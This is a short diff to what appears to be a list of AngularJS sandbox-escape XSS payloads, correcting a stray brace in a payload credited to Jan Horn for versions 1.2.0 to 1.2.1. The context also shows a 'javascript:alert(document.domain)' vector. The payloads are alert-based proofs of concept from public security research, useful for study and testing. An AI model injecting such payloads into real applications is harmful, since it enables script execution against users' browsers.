@@ -198,7 +198,7 @@ __ javascript:alert(document.domain)
 **1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)
 
 ```js
-{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
 **1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
